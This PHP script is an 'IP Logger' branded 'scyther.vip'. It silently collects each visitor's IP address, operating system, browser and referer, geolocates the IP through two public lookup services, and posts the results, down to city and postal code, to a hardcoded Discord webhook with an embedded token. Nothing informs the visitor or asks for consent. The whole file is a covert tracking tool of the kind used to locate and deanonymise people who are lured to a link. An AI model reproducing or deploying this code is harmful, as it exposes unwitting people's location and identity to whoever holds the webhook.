<?php
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
function getOS() { 
    global $user_agent;
    $os_platform    =   "scyther.vip";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
							'/kalilinux/i'          =>  'Wannabe Hacker',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile',
							'/Windows Phone/i'      =>  'Windows Phone'
                        );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}
function getBrowser() {
    global $user_agent;
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
							'/Mozilla/i'	=>	'Mozila',
							'/Mozilla/5.0/i'=>	'Mozila',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/edge/i'       =>  'Edge',
                            '/opera/i'      =>  'Opera',
							'/OPR/i'        =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
							'/Bot/i'		=>	'Spam',
							'/Valve Steam GameOverlay/i'  =>  'Steam',
                            '/mobile/i'     =>  'scyther.vip'
                        );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
$user_os        =   getOS();
$user_browser   =   getBrowser();

$ip = $_SERVER['REMOTE_ADDR'];
$site_refer = $_SERVER['HTTP_REFERER'];
	if($site_refer == ""){
		$site = "dirrect connection";
	}
else{
		$site = $site_refer;
	}
date_default_timezone_set('Europe/London');
$time = date('Y-m-d H:i:s');
$url = "https://discord.com/api/webhooks/991739315380035734/y5boN5TdOjpB_QSsVQnsaE_gPvR5EQm-ngkGHkt0k8rkm_v6iqrY-rwfNhpWmsbfoBni";

$ipdat = @json_decode(file_get_contents( 
    "http://www.geoplugin.net/json.gp?ip=" . $ip)); 

$ipshet = @json_decode(file_get_contents( 
    "http://ip-api.com/json/" . $ip));

$hookObject = json_encode([
    "username" => "IP Logger",
    "avatar_url" => "https://cdn.discordapp.com/attachments/991739268240248915/991750024935526460/9c9e6-16236531102948-800.png",
    "tts" => false,
    "embeds" => [
        [
            "title" => "scyther.vip Logger",

            "type" => "rich",

            "description" => "**IP: `$ip`\nDevice: `$user_os`\nBrowser: `$user_browser`\nTime: `$time`\nCountry: `$ipdat->geoplugin_countryName`\nCity: `$ipdat->geoplugin_city`\nContinent: `$ipdat->geoplugin_continentName`\nTimezone: `$ipdat->geoplugin_timezone`\nPostal Code: `$ipshet->zip`**",

            "url" => "https://scyther.vip",

            "color" => hexdec( "2f3136" ),

            "footer" => [
                "text" => "scyther.vip",
                "icon_url" => "https://cdn.discordapp.com/attachments/991739268240248915/991750024935526460/9c9e6-16236531102948-800.png"
            ],

            "author" => [
                "name" => "scyther.vip",
                "url" => "https://scyther.vip"
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );

?>
